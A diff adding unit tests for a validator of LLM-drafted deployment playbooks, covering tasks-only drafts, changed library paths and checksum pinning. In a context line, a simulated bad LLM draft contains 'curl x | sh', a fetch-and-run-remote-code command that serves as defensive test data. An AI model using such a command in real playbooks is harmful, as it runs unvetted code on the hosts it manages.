@@ -129,6 +129,22 @@ class Playbook(unittest.TestCase):
         no_pin = self.text.replace('checksum: "sha256:', 'checksum_off: "')
         self.assertFalse(self.ok(no_pin)['checksum'])
 
+    def test_tasks_only_draft_is_rejected(self):
+        # What the live LLM produced on 2026-11-05: the task list, without the play header or its vars.
+        tasks_only = '\n'.join(l[4:] for l in self.text.split('\n  tasks:\n', 1)[1].splitlines())
+        ok = {c['id']: c['ok'] for c in appv2.check_playbook(tasks_only, self.text)}
+        self.assertFalse(ok['play'])
+        self.assertFalse(ok['pinned'])
+
+    def test_changed_path_is_rejected(self):
+        moved = self.text.replace('/opt/apps/orders-service/lib', '/tmp/lib', 1)
+        ok = {c['id']: c['ok'] for c in appv2.check_playbook(moved, self.text)}
+        self.assertTrue(ok['play'])
+        self.assertFalse(ok['pinned'])
+
+    def test_template_passes_with_pinning(self):
+        self.assertTrue(all(c['ok'] for c in appv2.check_playbook(self.text, self.text)))
+
     def test_bad_llm_draft_falls_back_to_template(self):
         appv2.configure(demo_mode=lambda: False, llm=lambda prompt: '- hosts: all\n  tasks:\n    - shell: curl x | sh\n')
         ev = appv2.DEMO_EVENTS[0]
